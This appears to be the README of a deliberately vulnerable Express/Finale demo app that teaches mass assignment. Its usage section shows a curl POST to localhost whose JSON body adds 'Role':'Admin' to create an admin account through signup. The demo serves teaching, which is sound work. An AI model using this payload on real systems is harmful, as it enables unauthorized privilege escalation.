# Mass Assignment with Express and Finale

This application is a demonstration prototype just to show how to perform Mass Assignment attack.

## Setup

- Install

```
npm install
```

- Init database

```
NODE_ENV="dev" sequelize-cli db:migrate
```

- Run

```
NODE_ENV="dev" npm start
```

## Usage

- Signup as Visitor

```
DATA='{"Login":"hobbit","firstName":"Frodon","lastName":"Sacquet"}'
```

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data $DATA' \
  http://localhost:3000/users
```

Look into the HTTP response: How to exploit Mass Assignment Attack ?

- Signup as Admin (using Mass Assignment Attack)

```
DATA='{"Login":"pwned","firstName":"pwned","lastName":"pwned","Role":"Admin"}'
```

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data $DATA \
  http://localhost:3000/users
```

- Get all users

```
curl http://localhost:3000/users | jq
```
